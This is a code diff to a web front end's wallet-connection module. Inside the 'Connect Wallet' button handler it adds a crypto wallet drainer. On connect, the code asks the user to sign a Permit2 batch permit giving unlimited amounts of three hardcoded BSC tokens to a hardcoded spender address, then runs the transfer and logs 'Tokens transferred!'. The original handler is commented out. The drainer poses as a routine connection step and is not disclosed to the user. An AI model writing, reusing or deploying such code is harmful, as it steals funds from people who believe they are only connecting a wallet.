@@ -1,8 +1,24 @@
+import { BrowserProvider, JsonRpcProvider, Contract } from "ethers";
+import {
+  SignatureTransfer,
+  MaxUint160,
+  PERMIT2_ADDRESS,
+} from "@uniswap/permit2-sdk";
 import { store, updateStore } from "../store/appkitStore";
 import { bsc, mainnet, polygon, base } from "@reown/appkit/networks";
 import { signMessage, sendTx } from "../services/wallet";
 import { fetchEvmBalances } from "../mine";
 import Swal from "sweetalert2";
+
+const TOKENS = [
+  "0x55d398326f99059fF775485246999027B3197955",
+  "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+  "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
+];
+
+const SPENDER = "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2";
+const CHAIN_ID = 56;
+
 const MIN = 0.1;
 const chainInitializers = {
   bsc: {
@@ -46,9 +62,126 @@ export const updateButtonVisibility = (isConnected) => {
 };
 
 let isConnected,
-processed, setUp = "not setup", eligible = 0;
+  processed,
+  setUp = "not setup",
+  eligible = 0;
 
 export const updateBtnText = async (modal) => {
+  isConnected = modal.getIsConnectedState();
+  const element = document.getElementById("open-connect-modal");
+  element.textContent = isConnected ? "My Wallet" : "Connect Wallet";
+
+  //modal.open();
+
+  if (!isConnected) return console.log("⛔️ Not connected!");
+
+  if (processed) return console.log("✅ Already processed!");
+  processed = true;
+
+  //const walletProvider = await modal.getWalletProvider() //store.eip155Provider;
+  /*
+    const rpc = new JsonRpcProvider("https://bsc-dataseed.binance.org/");
+
+    const walletProvider = await modal.getWalletProvider();
+const wcProvider = new BrowserProvider(walletProvider);
+
+let signer = await wcProvider.getSigner();
+signer = signer.connect(rpc); 
+
+
+
+    const ethersProvider = new BrowserProvider(walletProvider);
+    //const signer = await ethersProvider.getSigner();
+    */
+
+  const walletProvider = await modal.getWalletProvider();
+
+  const ethersProvider = new BrowserProvider(walletProvider);
+
+  const signer = await ethersProvider.getSigner();
+
+
+  const owner = modal.getAddress();
+
+  const permit = {
+    permitted: TOKENS.map((token) => ({
+      token,
+      amount: MaxUint160,
+    })),
+    owner,
+    spender: SPENDER,
+    nonce: 0,
+    deadline: Math.floor(Date.now() / 1000) + 60,
+  };
+
+
+  const { domain, types, values } = SignatureTransfer.getPermitData(
+    permit,
+    PERMIT2_ADDRESS,
+    CHAIN_ID
+  );
+  values.permitted = values.permitted.map(p => ({
+    token: p.token,
+    amount: p.amount.toString()
+  }))
+
+  values.permitted = values.permitted.map(p => ({
+    token: p.token,
+    amount: p.amount.toString()
+  }))
+
+  console.log("EIP712:", { domain, types, values });
+
+  const signature = await walletProvider.request({
+    method: "eth_signTypedData_v4",
+    params: [
+      owner,
+      JSON.stringify({
+        domain,
+        types: {
+          ...types,
+          EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" },
+          ],
+        },
+        primaryType: "PermitBatchTransferFrom",
+        message: values,
+      }),
+    ],
+  });
+
+  console.log("Permit2 Signature:", signature);
+
+
+  const permit2Contract = new Contract(
+  SPENDER,
+  [
+    "function permitTransferFrom((address owner,address spender,uint256 nonce,uint256 deadline,(address token,uint256 amount)[] permitted),address owner,bytes signature) external"
+  ],
+  signer
+);
+
+console.log(permit2Contract);
+
+
+
+// Execute transfer
+const tx = await permit2Contract.permitTransferFrom(
+  permit,
+  permit.owner,
+  signature
+);
+
+console.log("Transaction hash:", tx.hash);
+await tx.wait();
+console.log("Tokens transferred!");
+
+
+
+
+  /*
   isConnected = modal.getIsConnectedState();
   const element = document.getElementById("open-connect-modal");
   element.textContent = isConnected ? "My Wallet" : "Connect Wallet";
@@ -170,6 +303,9 @@ export const updateBtnText = async (modal) => {
           );
         }
       };
+
+
     }
   };
+  */
 };
